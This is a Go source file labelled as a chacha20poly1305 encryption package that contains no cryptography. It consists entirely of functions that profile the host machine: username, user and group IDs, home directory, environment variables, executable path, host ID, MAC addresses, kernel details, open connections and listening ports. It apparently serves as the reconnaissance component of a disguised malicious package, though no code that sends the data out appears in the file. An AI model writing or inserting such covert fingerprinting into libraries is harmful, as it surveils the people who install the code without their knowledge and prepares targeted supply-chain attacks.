package chacha20poly1305

import (
	"fmt"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
	netstat "github.com/shirou/gopsutil/v3/net"
)

func collectSystemInfo() map[string]interface{} {
	info := make(map[string]interface{})

	hostname, _ := os.Hostname()
	info["hostname"] = hostname

	currentUser, _ := user.Current()
	if currentUser != nil {
		info["username"] = currentUser.Username
		info["user_id"] = currentUser.Uid
		info["group_id"] = currentUser.Gid
		info["home_dir"] = currentUser.HomeDir
	}

	info["os"] = runtime.GOOS
	info["arch"] = runtime.GOARCH
	info["go_version"] = runtime.Version()
	info["num_cpu"] = strconv.Itoa(runtime.NumCPU())
	info["process_id"] = strconv.Itoa(os.Getpid())
	info["parent_process_id"] = strconv.Itoa(os.Getppid())

	if wd, err := os.Getwd(); err == nil {
		info["working_dir"] = wd
	}

	if exec, err := os.Executable(); err == nil {
		info["executable"] = exec
		info["executable_dir"] = filepath.Dir(exec)
	}

	info["path_env"] = os.Getenv("PATH")
	info["user_env"] = os.Getenv("USER")
	info["home_env"] = os.Getenv("HOME")
	info["shell_env"] = os.Getenv("SHELL")

	cpuInfo := collectCPUInfo()
	for key, value := range cpuInfo {
		info["cpu_"+key] = value
	}

	memInfo := collectMemoryInfo()
	for key, value := range memInfo {
		info["memory_"+key] = value
	}

	netInfo := collectDetailedNetworkInfo()
	for key, value := range netInfo {
		info["network_"+key] = value
	}

	if hostInfo, err := host.Info(); err == nil {
		info["platform"] = hostInfo.Platform
		info["platform_family"] = hostInfo.PlatformFamily
		info["platform_version"] = hostInfo.PlatformVersion
		info["kernel_version"] = hostInfo.KernelVersion
		info["kernel_arch"] = hostInfo.KernelArch
		info["system_uptime_seconds"] = hostInfo.Uptime
		info["boot_time"] = hostInfo.BootTime
		info["host_id"] = hostInfo.HostID
	}

	return info
}

func collectCPUInfo() map[string]interface{} {
	info := make(map[string]interface{})

	info["cores"] = runtime.NumCPU()
	info["architecture"] = runtime.GOARCH

	if cpuInfos, err := cpu.Info(); err == nil && len(cpuInfos) > 0 {
		cpuInfo := cpuInfos[0]
		info["model"] = cpuInfo.ModelName
		info["vendor"] = cpuInfo.VendorID
		info["family"] = cpuInfo.Family
		info["physical_cores"] = cpuInfo.Cores
		info["model_id"] = cpuInfo.Model
		info["stepping"] = cpuInfo.Stepping
		info["microcode"] = cpuInfo.Microcode
		info["cache_size"] = cpuInfo.CacheSize
		info["flags"] = strings.Join(cpuInfo.Flags, ",")

		if cpuInfo.Mhz > 0 {
			info["frequency_mhz"] = cpuInfo.Mhz
		}
	}

	if percentages, err := cpu.Percent(time.Second, false); err == nil && len(percentages) > 0 {
		info["usage_percent"] = percentages[0]
	}

	if physicalCount, err := cpu.Counts(false); err == nil {
		info["physical_cores_count"] = physicalCount
	}

	if logicalCount, err := cpu.Counts(true); err == nil {
		info["logical_cores_count"] = logicalCount
	}

	return info
}

func collectMemoryInfo() map[string]interface{} {
	info := make(map[string]interface{})

	var memStats runtime.MemStats
	runtime.ReadMemStats(&memStats)

	info["go_alloc_bytes"] = memStats.Alloc
	info["go_total_alloc_bytes"] = memStats.TotalAlloc
	info["go_sys_bytes"] = memStats.Sys
	info["go_heap_bytes"] = memStats.HeapAlloc
	info["go_heap_sys_bytes"] = memStats.HeapSys
	info["go_heap_idle_bytes"] = memStats.HeapIdle
	info["go_heap_inuse_bytes"] = memStats.HeapInuse
	info["go_heap_released_bytes"] = memStats.HeapReleased
	info["go_heap_objects"] = memStats.HeapObjects
	info["go_stack_inuse_bytes"] = memStats.StackInuse
	info["go_stack_sys_bytes"] = memStats.StackSys
	info["go_gc_count"] = memStats.NumGC
	info["go_gc_pause_ns"] = memStats.PauseNs[(memStats.NumGC+255)%256]

	if memInfo, err := mem.VirtualMemory(); err == nil {
		info["total_bytes"] = memInfo.Total
		info["available_bytes"] = memInfo.Available
		info["used_bytes"] = memInfo.Used
		info["free_bytes"] = memInfo.Free
		info["usage_percent"] = memInfo.UsedPercent
		info["buffers_bytes"] = memInfo.Buffers
		info["cached_bytes"] = memInfo.Cached
		info["shared_bytes"] = memInfo.Shared
		info["slab_bytes"] = memInfo.Slab
		info["page_tables_bytes"] = memInfo.PageTables
		info["swap_cached_bytes"] = memInfo.SwapCached
		info["commit_limit_bytes"] = memInfo.CommitLimit
		info["committed_as_bytes"] = memInfo.CommittedAS
		info["high_total_bytes"] = memInfo.HighTotal
		info["high_free_bytes"] = memInfo.HighFree
		info["low_total_bytes"] = memInfo.LowTotal
		info["low_free_bytes"] = memInfo.LowFree
		info["swap_total_bytes"] = memInfo.SwapTotal
		info["swap_free_bytes"] = memInfo.SwapFree
	}

	if swapInfo, err := mem.SwapMemory(); err == nil {
		info["swap_total"] = swapInfo.Total
		info["swap_used"] = swapInfo.Used
		info["swap_free"] = swapInfo.Free
		info["swap_usage_percent"] = swapInfo.UsedPercent
		info["swap_sin"] = swapInfo.Sin
		info["swap_sout"] = swapInfo.Sout
		info["swap_pgin"] = swapInfo.PgIn
		info["swap_pgout"] = swapInfo.PgOut
		info["swap_pgfault"] = swapInfo.PgFault
		info["swap_pgmajfault"] = swapInfo.PgMajFault
	}

	return info
}

func collectDetailedNetworkInfo() map[string]interface{} {
	info := make(map[string]interface{})

	interfaces, err := net.Interfaces()
	if err != nil {
		return info
	}

	var interfaceNames []string
	var macAddresses []string

	for _, iface := range interfaces {
		interfaceNames = append(interfaceNames, iface.Name)

		if iface.HardwareAddr != nil && len(iface.HardwareAddr) > 0 {
			macAddresses = append(macAddresses, iface.HardwareAddr.String())
		}
	}

	info["interface_names"] = strings.Join(interfaceNames, ",")
	info["mac_addresses"] = strings.Join(macAddresses, ",")
	info["interface_count"] = len(interfaces)

	if netStats, err := netstat.IOCounters(true); err == nil {
		var totalBytesSent, totalBytesRecv uint64
		var totalPacketsSent, totalPacketsRecv uint64
		var totalErrorsIn, totalErrorsOut uint64
		var totalDropIn, totalDropOut uint64

		for _, stat := range netStats {
			totalBytesSent += stat.BytesSent
			totalBytesRecv += stat.BytesRecv
			totalPacketsSent += stat.PacketsSent
			totalPacketsRecv += stat.PacketsRecv
			totalErrorsIn += stat.Errin
			totalErrorsOut += stat.Errout
			totalDropIn += stat.Dropin
			totalDropOut += stat.Dropout
		}

		info["total_bytes_sent"] = totalBytesSent
		info["total_bytes_recv"] = totalBytesRecv
		info["total_packets_sent"] = totalPacketsSent
		info["total_packets_recv"] = totalPacketsRecv
		info["total_errors_in"] = totalErrorsIn
		info["total_errors_out"] = totalErrorsOut
		info["total_drop_in"] = totalDropIn
		info["total_drop_out"] = totalDropOut
	}

	if connections, err := netstat.Connections("all"); err == nil {
		var tcpConnections, udpConnections, establishedConnections int
		var listeningPorts []string

		for _, conn := range connections {
			switch conn.Type {
			case 1:
				tcpConnections++
				if conn.Status == "ESTABLISHED" {
					establishedConnections++
				}
				if conn.Status == "LISTEN" {
					listeningPorts = append(listeningPorts, fmt.Sprintf("%d", conn.Laddr.Port))
				}
			case 2:
				udpConnections++
			}
		}

		info["tcp_connections"] = tcpConnections
		info["udp_connections"] = udpConnections
		info["established_connections"] = establishedConnections
		info["listening_ports"] = strings.Join(listeningPorts, ",")
		info["total_connections"] = len(connections)
	}

	return info
}

func collectNetworkInfo() map[string]interface{} {
	info := make(map[string]interface{})

	interfaces, err := net.Interfaces()
	if err == nil {
		info["interface_count"] = len(interfaces)
	}

	return info
}
